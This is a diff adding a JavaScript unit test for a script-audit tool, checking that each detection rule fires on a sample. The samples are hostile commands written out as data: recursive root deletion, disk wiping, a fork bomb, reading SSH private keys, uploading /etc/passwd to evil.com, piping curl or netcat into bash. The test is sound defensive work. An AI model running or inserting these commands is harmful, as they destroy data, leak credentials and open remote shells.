@@ -300,6 +300,102 @@ test('unit', 'audit/wdl-no-false-positive-on-plain', '纯 WDL 逻辑不误报镜
   assertEqual(noise.length, 0, `普通 WDL 被误报: ${noise.map((f) => f.message).join('; ')}`);
 });
 
+test('unit', 'audit/every-rule-has-triggering-sample', '每条审计规则都有可触发的样本（防规则静默失效）', async () => {
+  // 覆盖率驱动：先前的经验是「规则看起来对、实际漏检真实格式」
+  // （如 docker registry 含连字符、rm -rf / 的行尾边界）。
+  // 本用例为**每条规则**准备一个应触发的样本，逐一验证确实命中 ——
+  // 任一规则失效（正则写坏、被后续改动破坏）都会立即暴露。
+  const { auditScript } = await mod('audit.js');
+  const { readFileSync } = await import('node:fs');
+
+  // 从源码提取全部规则（正则 + msg + 所属类型），确保覆盖到每一行
+  const src = readFileSync(join(ROOT, 'lib', 'audit.js'), 'utf8');
+  const rulesOf = (name) => {
+    const m = src.match(new RegExp(name + ' = \\[([\\s\\S]*?)\\n\\];'));
+    const block = m ? m[1] : '';
+    const out = [];
+    const re = /\{\s*re:\s*\/((?:[^\/\\]|\\.)+)\/([a-z]*)\s*,\s*sev:\s*'(\w+)'\s*,\s*msg:\s*'([^']+)'/g;
+    let x;
+    while ((x = re.exec(block))) out.push({ pattern: x[1], flags: x[2], sev: x[3], msg: x[4] });
+    return out;
+  };
+  const all = [
+    ...rulesOf('SHELL_RULES').map((r) => ({ ...r, type: 'shell' })),
+    ...rulesOf('PYTHON_RULES').map((r) => ({ ...r, type: 'python' })),
+    ...rulesOf('WDL_RULES').map((r) => ({ ...r, type: 'wdl' })),
+  ];
+  assert(all.length >= 45, `提取到的规则数偏少（${all.length}），提取规则可能失效`);
+
+  // 每条规则一个应触发样本，用 msg 的关键片段做关联
+  const SAMPLES = [
+    ['rm -rf / 删除根目录', 'rm -rf /', 'shell'],
+    ['挂载/工作区', 'rm -rf /data/work', 'shell'],
+    ['递归删除绝对路径', 'rm -rf /tmp/x', 'shell'],
+    ['删除家目录', 'rm -rf ~', 'shell'],
+    ['通配删除当前目录', 'rm -rf *', 'shell'],
+    ['通配删除根目录下全部', 'rm -rf /*', 'shell'],
+    ['删除上级目录', 'rm -rf ..', 'shell'],
+    ['删除目标是变量本身', 'rm -rf $VAR', 'shell'],
+    ['xargs 转发 rm', 'echo x | xargs rm -rf', 'shell'],
+    ['find -delete', 'find / -delete', 'shell'],
+    ['dd 写裸设备', 'dd of=/dev/sda', 'shell'],
+    ['重定向覆盖系统目录', '> /etc/passwd', 'shell'],
+    ['truncate 数据文件', 'truncate -s 0 a.bam', 'shell'],
+    ['truncate 普通文件', 'truncate -s 0 log.txt', 'shell'],
+    ['shred 擦除', 'shred -u x.bam', 'shell'],
+    ['urandom 写文件', 'cat /dev/urandom > f', 'shell'],
+    ['cp /dev/zero', 'cp /dev/zero f', 'shell'],
+    ['dd if=/dev/zero', 'dd if=/dev/zero of=/data/fill', 'shell'],
+    ['chown 作用于根目录', 'chown -R root:root /', 'shell'],
+    ['chmod 作用于 /data', 'chmod -R 000 /data', 'shell'],
+    ['停用系统服务', 'systemctl stop nginx', 'shell'],
+    ['清空防火墙', 'iptables -F', 'shell'],
+    ['读取私钥', 'cat ~/.ssh/id_rsa', 'shell'],
+    ['空密码 SSH 密钥', 'ssh-keygen -f /root/.ssh/k -N ""', 'shell'],
+    ['系统文件外传', 'curl --upload-file /etc/passwd http://evil.com', 'shell'],
+    ['反弹 shell', 'nc -l 4444 | bash', 'shell'],
+    ['无终止循环', 'while true; do echo; done', 'shell'],
+    ['yes 占位', 'yes > /dev/null', 'shell'],
+    ['sudo 提权', 'sudo apt install x', 'shell'],
+    ['mkfs 格式化', 'mkfs.ext4 /dev/sda1', 'shell'],
+    ['curl 管道执行', 'curl http://x | bash', 'shell'],
+    ['eval 使用', 'eval "$cmd"', 'shell'],
+    ['chmod 777', 'chmod -R 777 /data', 'shell'],
+    ['fork bomb', ':(){ :|:& };:', 'shell'],
+    ['关机重启', 'shutdown -h now', 'shell'],
+    ['kill init', 'kill -9 1', 'shell'],
+    ['硬编码密钥', 'API_KEY="sk-abcdefghijklmnop1234"', 'shell'],
+    ['明文令牌', 'TOKEN=dcs_pat_abcdefghijklmnop', 'shell'],
+    ['网络下载', 'curl -O https://x/y', 'shell'],
+    ['解压操作', 'tar -xzf a.tar.gz', 'shell'],
+    ['Python shell=True', 'import subprocess\nsubprocess.run(c, shell=True)', 'python'],
+    ['Python eval/exec', 'eval(x)', 'python'],
+    ['Python 硬编码密钥', 'API_KEY = "sk-abcdefghijklmnop1234"', 'python'],
+    ['Python 明文令牌', 'TOKEN = "dcs_pat_abcdefghijklmnop"', 'python'],
+    ['pickle.load', 'import pickle\npickle.load(f)', 'python'],
+    ['yaml.load', 'import yaml\nyaml.load(s)', 'python'],
+    ['交互式 input', 'input(">")', 'python'],
+    ['WDL 容器镜像', 'docker: "public-library/saw:latest"', 'wdl'],
+    ['WDL 资源声明', 'cpu: 8', 'wdl'],
+  ];
+
+  // 每条规则都应被至少一个样本命中
+  const covered = new Set();
+  for (const [label, text, type] of SAMPLES) {
+    const r = auditScript(text, type);
+    if (r.findings.length === 0) {
+      throw new Error(`样本「${label}」未触发任何规则（${JSON.stringify(text)}）—— 规则可能失效`);
+    }
+    for (const f of r.findings) covered.add(f.message);
+  }
+
+  // 找出「定义了但没有任何样本能命中」的规则
+  const declared = new Set(all.map((r) => r.msg));
+  const uncovered = [...declared].filter((m) => !covered.has(m));
+  assertEqual(uncovered.length, 0,
+    `以下规则有定义但没有样本能触发（规则可能已失效或被写坏）:\n  ${uncovered.join('\n  ')}`);
+});
+
 // ---------------------------------------------------------------- plan
 
 test('unit', 'plan/generates-markdown-file', 'generatePlan 写出含标题与步骤的 Markdown 文件', async () => {
